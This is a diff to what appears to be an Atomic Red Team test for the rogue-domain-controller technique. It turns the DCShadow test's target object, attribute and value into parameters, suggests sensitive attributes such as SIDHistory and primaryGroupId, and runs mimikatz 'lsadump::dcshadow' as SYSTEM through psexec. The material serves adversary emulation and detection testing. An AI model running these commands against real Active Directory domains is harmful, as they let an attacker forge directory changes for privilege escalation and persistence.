@@ -17,10 +17,18 @@ atomic_tests:
   supported_platforms:
   - windows
   input_arguments:
-    user:
-      description: Targeted user (for machine account do not forget to add final '$')
+    object:
+      description: Targeted object (for machine account do not forget to add final '$')
       type: string
-      default: CLIENT1$
+      default: bruce.wayne
+    attribute:
+      description: "Object attribute to edit, interesting ones: badpwdcount, primaryGroupId, SIDHistory..."
+      type: string
+      default: badpwdcount
+    value:
+      description: Value to assign to object attribute
+      type: string
+      default: 9999
     mimikatz_path:
       description: Mimikatz windows executable
       type: path
@@ -58,7 +66,7 @@ atomic_tests:
       # starting fake DC server, as SYSTEM (required)
       $dc_output_file = "$env:TEMP\art-T1207-mimikatz-DC.log"
       Remove-Item $dc_output_file -ErrorAction Ignore
-      $mimikatzParam ="`"log $dc_output_file`" `"lsadump::dcshadow /object:#{user} /attribute:badpwdcount /value:9999`" `"exit`""
+      $mimikatzParam ="`"log $dc_output_file`" `"lsadump::dcshadow /object:#{object} /attribute:#{attribute} /value:#{value}`" `"exit`""
       $dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList "/c #{psexec_path} /accepteula -d -s #{mimikatz_path} $mimikatzParam"
 
       # wait for fake DC server to be ready...
@@ -72,6 +80,7 @@ atomic_tests:
 
       Write-Host "`nOutput from fake DC server:"
       Get-Content $dc_output_file
+      Start-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it
       Remove-Item $dc_output_file -ErrorAction Ignore
 
       Write-Host "End of DCShadow"
